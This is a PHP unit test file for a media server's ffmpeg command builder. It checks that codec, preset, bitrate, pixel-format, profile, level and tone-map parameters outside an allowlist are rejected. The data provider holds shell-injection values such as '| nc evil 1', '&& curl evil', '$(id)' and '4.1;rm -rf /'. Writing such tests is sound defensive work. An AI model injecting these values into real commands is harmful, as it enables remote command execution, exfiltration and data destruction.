<?php

/**
 * Phlix media server component: Tests.
 *
 * @copyright 2026 Joe Huss <detain@interserver.net>
 * @license   MPL-2.0
 */

declare(strict_types=1);

namespace Phlix\Tests\Unit\Media\Transcoding;

use InvalidArgumentException;
use Phlix\Media\Transcoding\FfmpegRunner;
use PHPUnit\Framework\TestCase;

/**
 * minors M-SERVER-77 (W-min100): the ffmpeg-argv boundary allowlist.
 *
 * Every `segment_params` string that the builders splice into the command line
 * UNESCAPED (`-c:v`, `-preset`, `-c:a`, `-b:a`, `-pix_fmt`, `-profile:v`,
 * `-level`, and the threaded `tone_map_filter` that lands inside the
 * double-quoted `-vf "…"` context) is now read through
 * `FfmpegRunner::argvParam()`, which rejects anything outside its slot's
 * family — before a command is built. These pins are the fail-loud proof: the
 * rejection arm for each slot family, and the acceptance arm proving every
 * legitimate producer value still passes and reaches the argv verbatim.
 *
 * The builders are pure string functions (nothing executes), so the assertions
 * are on the returned command; a rejected param must NEVER appear in it, which
 * is what the exception (not a sanitized substitute) guarantees.
 */
final class FfmpegRunnerArgvBoundaryTest extends TestCase
{
    private function runner(): FfmpegRunner
    {
        return new FfmpegRunner('/usr/bin/ffmpeg', '/usr/bin/ffprobe', '/tmp');
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function rejectedParamProvider(): array
    {
        return [
            'video codec with shell break' => ['video_codec', 'libx264 -map 0:1; id'],
            'video codec with quote' => ['video_codec', 'libx264"'],
            'preset with shell break' => ['preset', 'veryfast && curl evil'],
            'audio codec with pipe' => ['audio_codec', 'aac | nc evil 1'],
            'audio bitrate with subshell' => ['audio_bitrate', '128k$(id)'],
            'pixel format with redirect' => ['pix_fmt', 'yuv420p > /etc/x'],
            'profile with backtick' => ['profile', 'high`id`'],
            'level with operator' => ['level', '4.1;rm -rf /'],
            'tone map filter with quote break' => ['tone_map_filter', 'zscale=t=linear",id="'],
            'tone map filter with space' => ['tone_map_filter', 'zscale=t=linear npl=100'],
        ];
    }

    /**
     * @dataProvider rejectedParamProvider
     */
    public function testSegmentCommandRejectsParamsOutsideTheArgvAllowlist(string $key, string $poison): void
    {
        $this->expectException(InvalidArgumentException::class);

        $this->runner()->buildSegmentCommand(
            '/input.mkv',
            '/tmp/out.ts',
            0.0,
            6.0,
            [$key => $poison],
        );
    }

    public function testAudioSegmentCommandRejectsPoisonedAudioCodec(): void
    {
        $this->expectException(InvalidArgumentException::class);

        $this->runner()->buildAudioSegmentCommand(
            '/input.mka',
            '/tmp/out.ts',
            0.0,
            6.0,
            ['audio_codec' => 'aac; id'],
        );
    }

    public function testLegitimateParamsReachTheCommandVerbatim(): void
    {
        $cmd = $this->runner()->buildSegmentCommand(
            '/input.mkv',
            '/tmp/out.ts',
            0.0,
            6.0,
            [
                'video_codec' => 'libx264',
                'preset' => 'medium',
                'pix_fmt' => 'yuv420p',
                'profile' => 'main',
                'level' => '4.1',
                'audio_codec' => 'aac',
                'audio_bitrate' => '192K',
            ],
        );

        $this->assertStringContainsString('-c:v libx264', $cmd);
        $this->assertStringContainsString('-preset medium', $cmd);
        $this->assertStringContainsString('-pix_fmt yuv420p', $cmd);
        $this->assertStringContainsString('-profile:v main', $cmd);
        $this->assertStringContainsString('-level 4.1', $cmd);
        $this->assertStringContainsString('-c:a aac', $cmd);
        $this->assertStringContainsString('-b:a 192K', $cmd);
    }

    public function testHouseToneMapGraphsPassTheFilterGraphAllowlist(): void
    {
        $zscale = 'zscale=t=linear:npl=100,format=gbrpf32le,'
            . 'zscale=p=bt709,tonemap=hable:desat=0,'
            . 'zscale=t=bt709:m=bt709:r=tv,format=yuv420p';

        $cmd = $this->runner()->buildSegmentCommand(
            '/input.mkv',
            '/tmp/out.ts',
            0.0,
            6.0,
            [
                'require_hdr_tone_map' => true,
                'tone_map_filter' => $zscale,
            ],
        );

        $this->assertStringContainsString('-vf "' . $zscale . '"', $cmd);
    }

    public function testEmptyCodecFallsBackToDefaultNotRejection(): void
    {
        $cmd = $this->runner()->buildSegmentCommand(
            '/input.mkv',
            '/tmp/out.ts',
            0.0,
            6.0,
            ['video_codec' => ''],
        );

        $this->assertStringContainsString('-c:v libx264', $cmd);
    }
}
